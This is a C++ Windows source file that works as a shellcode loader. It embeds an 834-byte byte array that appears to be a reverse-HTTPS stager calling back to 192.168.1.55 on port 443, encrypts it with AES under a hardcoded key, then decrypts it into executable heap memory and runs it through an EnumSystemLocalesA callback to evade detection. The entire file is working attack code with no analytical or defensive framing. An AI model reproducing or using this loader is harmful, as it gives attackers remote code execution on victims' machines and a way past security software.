// ReSharper disable CppClangTidyClangDiagnosticMicrosoftGoto
// ReSharper disable CppClangTidyHicppAvoidGoto
// ReSharper disable CppClangTidyCppcoreguidelinesAvoidGoto
#include <windows.h>
#include <bcrypt.h>
#include <functional>

#include "GetProcAddressWithHash.h"

#pragma comment(lib, "Bcrypt.lib")

static const BYTE rgbRawData[834] = {
	0xFC, 0xE8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xD2, 0x64,
	0x8B, 0x52, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,
	0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C,
	0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF0, 0x52, 0x57,
	0x8B, 0x52, 0x10, 0x8B, 0x42, 0x3C, 0x01, 0xD0, 0x8B, 0x40, 0x78, 0x85,
	0xC0, 0x74, 0x4A, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x8B, 0x58, 0x20,
	0x01, 0xD3, 0xE3, 0x3C, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF,
	0x31, 0xC0, 0xAC, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF4,
	0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75, 0xE2, 0x58, 0x8B, 0x58, 0x24,
	0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3, 0x8B,
	0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59,
	0x5A, 0x51, 0xFF, 0xE0, 0x58, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x86, 0x5D,
	0x68, 0x6E, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6E, 0x69, 0x54, 0x68,
	0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x31,
	0xFF, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3A, 0x56, 0x79, 0xA7, 0xFF,
	0xD5, 0xE9, 0xA4, 0x00, 0x00, 0x00, 0x5B, 0x31, 0xC9, 0x51, 0x51, 0x6A,
	0x03, 0x51, 0x51, 0x68, 0xBB, 0x01, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57,
	0x89, 0x9F, 0xC6, 0xFF, 0xD5, 0x50, 0xE9, 0x8C, 0x00, 0x00, 0x00, 0x5B,
	0x31, 0xD2, 0x52, 0x68, 0x00, 0x32, 0xC0, 0x84, 0x52, 0x52, 0x52, 0x53,
	0x52, 0x50, 0x68, 0xEB, 0x55, 0x2E, 0x3B, 0xFF, 0xD5, 0x89, 0xC6, 0x83,
	0xC3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xE0, 0x6A, 0x04, 0x50,
	0x6A, 0x1F, 0x56, 0x68, 0x75, 0x46, 0x9E, 0x86, 0xFF, 0xD5, 0x5F, 0x31,
	0xFF, 0x57, 0x57, 0x6A, 0xFF, 0x53, 0x56, 0x68, 0x2D, 0x06, 0x18, 0x7B,
	0xFF, 0xD5, 0x85, 0xC0, 0x0F, 0x84, 0xCA, 0x01, 0x00, 0x00, 0x31, 0xFF,
	0x85, 0xF6, 0x74, 0x04, 0x89, 0xF9, 0xEB, 0x09, 0x68, 0xAA, 0xC5, 0xE2,
	0x5D, 0xFF, 0xD5, 0x89, 0xC1, 0x68, 0x45, 0x21, 0x5E, 0x31, 0xFF, 0xD5,
	0x31, 0xFF, 0x57, 0x6A, 0x07, 0x51, 0x56, 0x50, 0x68, 0xB7, 0x57, 0xE0,
	0x0B, 0xFF, 0xD5, 0xBF, 0x00, 0x2F, 0x00, 0x00, 0x39, 0xC7, 0x75, 0x07,
	0x58, 0x50, 0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0x31, 0xFF, 0xE9, 0x91, 0x01,
	0x00, 0x00, 0xE9, 0xC9, 0x01, 0x00, 0x00, 0xE8, 0x6F, 0xFF, 0xFF, 0xFF,
	0x2F, 0x52, 0x4E, 0x52, 0x6A, 0x00, 0xAB, 0xB1, 0x3A, 0xFA, 0x4E, 0x25,
	0xDE, 0x4D, 0x74, 0x88, 0x83, 0x74, 0x0A, 0x26, 0x21, 0x82, 0x4E, 0x58,
	0x59, 0x11, 0x77, 0x2C, 0x85, 0x91, 0x86, 0x3B, 0xAF, 0xCB, 0x7B, 0xEE,
	0x53, 0x52, 0x8D, 0xB6, 0xFD, 0xB6, 0x27, 0xAC, 0xB4, 0x7F, 0x8F, 0xC2,
	0xC5, 0x72, 0x98, 0x4B, 0x65, 0xCE, 0x23, 0xBA, 0x9B, 0xB7, 0xA6, 0xED,
	0x01, 0x72, 0x1D, 0x10, 0x8D, 0x74, 0xE0, 0x24, 0x83, 0xF0, 0x78, 0xB2,
	0xF4, 0x98, 0x43, 0x9E, 0xE5, 0x76, 0xAB, 0x00, 0x55, 0x73, 0x65, 0x72,
	0x2D, 0x41, 0x67, 0x65, 0x6E, 0x74, 0x3A, 0x20, 0x4D, 0x6F, 0x7A, 0x69,
	0x6C, 0x6C, 0x61, 0x2F, 0x34, 0x2E, 0x30, 0x20, 0x28, 0x63, 0x6F, 0x6D,
	0x70, 0x61, 0x74, 0x69, 0x62, 0x6C, 0x65, 0x3B, 0x20, 0x4D, 0x53, 0x49,
	0x45, 0x20, 0x38, 0x2E, 0x30, 0x3B, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F,
	0x77, 0x73, 0x20, 0x4E, 0x54, 0x20, 0x35, 0x2E, 0x32, 0x3B, 0x20, 0x54,
	0x72, 0x69, 0x64, 0x65, 0x6E, 0x74, 0x2F, 0x34, 0x2E, 0x30, 0x3B, 0x20,
	0x2E, 0x4E, 0x45, 0x54, 0x20, 0x43, 0x4C, 0x52, 0x20, 0x32, 0x2E, 0x30,
	0x2E, 0x35, 0x30, 0x37, 0x32, 0x37, 0x29, 0x0D, 0x0A, 0x00, 0xC5, 0xAF,
	0x4B, 0xD4, 0x85, 0xD4, 0x21, 0xDE, 0x66, 0x0B, 0x17, 0xC7, 0x8E, 0x19,
	0x15, 0x1E, 0x8D, 0x92, 0xDC, 0xCE, 0xB3, 0x08, 0x9D, 0x68, 0xA6, 0xD5,
	0xEF, 0x97, 0x57, 0x16, 0xE8, 0x06, 0xC3, 0x58, 0xD3, 0xBA, 0x43, 0x6C,
	0x14, 0x5A, 0xF9, 0xEE, 0x45, 0x47, 0x15, 0x86, 0x35, 0xB9, 0x03, 0x32,
	0x2B, 0xC4, 0xAE, 0xA8, 0xEA, 0x8A, 0xD1, 0x58, 0x4A, 0x10, 0x55, 0x14,
	0x07, 0xF1, 0x93, 0x84, 0x53, 0x49, 0x34, 0x5C, 0xC5, 0x3A, 0x5A, 0xB6,
	0x62, 0x00, 0xD5, 0x4A, 0x72, 0xB4, 0x88, 0xB8, 0xF0, 0xB5, 0xD1, 0xF6,
	0x65, 0xE4, 0x39, 0xD6, 0x22, 0x6D, 0x35, 0x47, 0x78, 0x64, 0x7F, 0x55,
	0x77, 0x20, 0x60, 0x2C, 0x85, 0xCF, 0x49, 0xF8, 0x1E, 0x2B, 0xFD, 0x61,
	0x4C, 0x32, 0x02, 0x71, 0x12, 0x8E, 0x65, 0xEE, 0x04, 0x7C, 0x72, 0x45,
	0x19, 0xCC, 0x94, 0x29, 0x53, 0x63, 0xBB, 0x4E, 0x82, 0x13, 0xD1, 0x29,
	0x2F, 0x41, 0xC4, 0x7B, 0x35, 0xEF, 0x4A, 0x2A, 0xC6, 0x81, 0x3A, 0xEC,
	0x1C, 0x81, 0x69, 0x70, 0xC3, 0x8B, 0xCC, 0x90, 0x02, 0x14, 0x05, 0x0C,
	0x93, 0x43, 0xC3, 0x22, 0xD1, 0x20, 0xDE, 0x23, 0x3F, 0xB6, 0x73, 0x00,
	0x41, 0xC1, 0xE6, 0x4D, 0xB0, 0xE6, 0x19, 0xC6, 0xC4, 0xD3, 0x19, 0x73,
	0x45, 0x39, 0xA4, 0x47, 0x81, 0x45, 0x2D, 0x62, 0xB1, 0xA0, 0x00, 0xBB,
	0x6F, 0x67, 0xF0, 0xFE, 0x87, 0x68, 0xE0, 0x96, 0xAF, 0x7A, 0xED, 0x00,
	0x68, 0xF0, 0xB5, 0xA2, 0x56, 0xFF, 0xD5, 0x6A, 0x40, 0x68, 0x00, 0x10,
	0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xA4, 0x53,
	0xE5, 0xFF, 0xD5, 0x93, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xD9, 0x51,
	0x53, 0x89, 0xE7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68,
	0x12, 0x96, 0x89, 0xE2, 0xFF, 0xD5, 0x85, 0xC0, 0x74, 0xC6, 0x8B, 0x07,
	0x01, 0xC3, 0x85, 0xC0, 0x75, 0xE5, 0x58, 0xC3, 0xE8, 0x89, 0xFD, 0xFF,
	0xFF, 0x31, 0x39, 0x32, 0x2E, 0x31, 0x36, 0x38, 0x2E, 0x31, 0x2E, 0x35,
	0x35, 0x00, 0x12, 0x34, 0x56, 0x78
};

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

/* =================================================== DLL =================================================== */
void Run(PBYTE pbCipherText, DWORD cbCipherText)
{
    BCRYPT_ALG_HANDLE       hAesAlg = NULL;
    BCRYPT_KEY_HANDLE       hKey = NULL;
    NTSTATUS                status = STATUS_UNSUCCESSFUL;
    DWORD                   cbRawData = 0,
					        cbData = 0,
					        cbKeyObject = 0,
					        cbBlockLen = 0;
    PBYTE                   pbRawData = NULL,
					        pbKeyObject = NULL,
					        pbIV = NULL;
    BYTE                    rgbIV[16] = {};
    BYTE                    rgbAES128Key[16] = {};

    memcpy(rgbAES128Key, &pbCipherText[cbCipherText - 32], 16);
    memcpy(rgbIV, &pbCipherText[cbCipherText - 16], 16);

    // Open an algorithm handle.
    if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
        &hAesAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0)))
    {
        goto Cleanup;
    }

    // Calculate the size of the buffer to hold the KeyObject.
    if (!NT_SUCCESS(status = BCryptGetProperty(
        hAesAlg,
        BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObject,
        sizeof(DWORD),
        &cbData,
        0)))
    {;
        goto Cleanup;
    }

    // Allocate the key object on the heap.;
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (NULL == pbKeyObject)
    {
        goto Cleanup;
    }

    // Calculate the block length for the IV.
    if (!NT_SUCCESS(status = BCryptGetProperty(
        hAesAlg,
        BCRYPT_BLOCK_LENGTH,
        (PBYTE)&cbBlockLen,
        sizeof(DWORD),
        &cbData,
        0)))
    {;
        goto Cleanup;
    }

    // Determine whether the cbBlockLen is not longer than the IV length.
    if (cbBlockLen > sizeof(rgbIV))
    {;
        goto Cleanup;
    }

    // Allocate a buffer for the IV. The buffer is consumed during the 
    // encrypt/decrypt process.
    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
    if (NULL == pbIV)
    {
        goto Cleanup;
    }

    memcpy(pbIV, rgbIV, cbBlockLen);

    if (!NT_SUCCESS(status = BCryptSetProperty(
        hAesAlg,
        BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0)))
    {
        goto Cleanup;
    }

    // Generate the key from supplied input key bytes.
    if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
        hAesAlg,
        &hKey,
        pbKeyObject,
        cbKeyObject,
        (PBYTE)rgbAES128Key,
        sizeof(rgbAES128Key),
        0)))
    {
        goto Cleanup;
    }

    ////
	//// Get the output buffer size.
	////
	if (!NT_SUCCESS(status = BCryptDecrypt(
	    hKey,
	    pbCipherText,
	    cbCipherText - 32,
	    NULL,
	    pbIV,
	    cbBlockLen,
	    NULL,
	    0,
	    &cbRawData,
	    BCRYPT_BLOCK_PADDING)))
	{
	    goto Cleanup;
	}
	
	pbRawData = (PBYTE)HeapAlloc(
        HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0), 
        0, cbRawData);
	if (NULL == pbRawData)
	{
	    goto Cleanup;
	}

	if (!NT_SUCCESS(status = BCryptDecrypt(
	    hKey,
	    pbCipherText,
	    cbCipherText - 32,
	    NULL,
	    pbIV,
	    cbBlockLen,
	    pbRawData,
	    cbRawData,
	    &cbRawData,
	    BCRYPT_BLOCK_PADDING)))
	{
	    goto Cleanup;
	}

    EnumSystemLocalesA((LOCALE_ENUMPROCA)pbRawData, 0);

Cleanup:

    if (hAesAlg)
    {
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
    }

    if (hKey)
    {
        BCryptDestroyKey(hKey);
    }

    if (pbCipherText)
    {
        HeapFree(GetProcessHeap(), 0, pbCipherText);
    }

    if (pbRawData)
    {
        HeapFree(GetProcessHeap(), 0, pbRawData);
    }

    if (pbKeyObject)
    {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }

    if (pbIV)
    {
        HeapFree(GetProcessHeap(), 0, pbIV);
    }
}

/* =================================================== Loader ================================================ */
static const BYTE rgbIV[] =
{
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

static const BYTE rgbAES128Key[] =
{
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

void main()
{
	BCRYPT_ALG_HANDLE       hAesAlg = NULL;
	BCRYPT_KEY_HANDLE       hKey = NULL;
	NTSTATUS                status = STATUS_UNSUCCESSFUL;
	DWORD                   cbCipherText = 0,
							cbRawData = 0,
							cbData = 0,
							cbKeyObject = 0,
							cbBlockLen = 0;
	PBYTE                   pbCipherText = NULL,
							pbRawData = NULL,
							pbKeyObject = NULL,
							pbIV = NULL;
    BYTE                    creds[32] = {};

    // Open an algorithm handle.
    if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
        &hAesAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptOpenAlgorithmProvider\n", status);
        goto Cleanup;
    }

    // Calculate the size of the buffer to hold the KeyObject.
    if (!NT_SUCCESS(status = BCryptGetProperty(
        hAesAlg,
        BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObject,
        sizeof(DWORD),
        &cbData,
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptGetProperty\n", status);
        goto Cleanup;
    }

    // Allocate the key object on the heap.
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (NULL == pbKeyObject)
    {
        wprintf(L"**** memory allocation failed\n");
        goto Cleanup;
    }

    // Calculate the block length for the IV.
    if (!NT_SUCCESS(status = BCryptGetProperty(
        hAesAlg,
        BCRYPT_BLOCK_LENGTH,
        (PBYTE)&cbBlockLen,
        sizeof(DWORD),
        &cbData,
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptGetProperty\n", status);
        goto Cleanup;
    }

    // Determine whether the cbBlockLen is not longer than the IV length.
    if (cbBlockLen > sizeof(rgbIV))
    {
        wprintf(L"**** block length is longer than the provided IV length\n");
        goto Cleanup;
    }

    // Allocate a buffer for the IV. The buffer is consumed during the 
    // encrypt/decrypt process.
    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
    if (NULL == pbIV)
    {
        wprintf(L"**** memory allocation failed\n");
        goto Cleanup;
    }

    memcpy(pbIV, rgbIV, cbBlockLen);

    if (!NT_SUCCESS(status = BCryptSetProperty(
        hAesAlg,
        BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptSetProperty\n", status);
        goto Cleanup;
    }

    // Generate the key from supplied input key bytes.
    if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
        hAesAlg,
        &hKey,
        pbKeyObject,
        cbKeyObject,
        (PBYTE)rgbAES128Key,
        sizeof(rgbAES128Key),
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptGenerateSymmetricKey\n", status);
        goto Cleanup;
    }

    cbRawData = sizeof(rgbRawData);
    pbRawData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbRawData);
    if (NULL == pbRawData)
    {
        wprintf(L"**** memory allocation failed\n");
        goto Cleanup;
    }

    memcpy(pbRawData, rgbRawData, sizeof(rgbRawData));

    //
    // Get the output buffer size.
    //
    if (!NT_SUCCESS(status = BCryptEncrypt(
        hKey,
        pbRawData,
        cbRawData,
        NULL,
        pbIV,
        cbBlockLen,
        NULL,
        0,
        &cbCipherText,
        BCRYPT_BLOCK_PADDING)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
        goto Cleanup;
    }

    pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText + 32);
    if (NULL == pbCipherText)
    {
        wprintf(L"**** memory allocation failed\n");
        goto Cleanup;
    }

    // Use the key to encrypt the plaintext buffer.
    // For block sized messages, block padding will add an extra block.
    if (!NT_SUCCESS(status = BCryptEncrypt(
        hKey,
        pbRawData,
        cbRawData,
        NULL,
        pbIV,
        cbBlockLen,
        pbCipherText,
        cbCipherText,
        &cbData,
        BCRYPT_BLOCK_PADDING)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
        goto Cleanup;
    }

    std::copy_n(rgbAES128Key, 16, creds);
    std::copy_n(rgbIV, 16, creds + 16);

    memcpy(&pbCipherText[cbCipherText], creds, sizeof(creds));
	
	Run(pbCipherText, cbCipherText + 32);

Cleanup:

    if (hAesAlg)
    {
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
    }

    if (hKey)
    {
        BCryptDestroyKey(hKey);
    }

    if (pbCipherText)
    {
        HeapFree(GetProcessHeap(), 0, pbCipherText);
    }

    if (pbRawData)
    {
        HeapFree(GetProcessHeap(), 0, pbRawData);
    }

    if (pbKeyObject)
    {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }

    if (pbIV)
    {
        HeapFree(GetProcessHeap(), 0, pbIV);
    }
	
}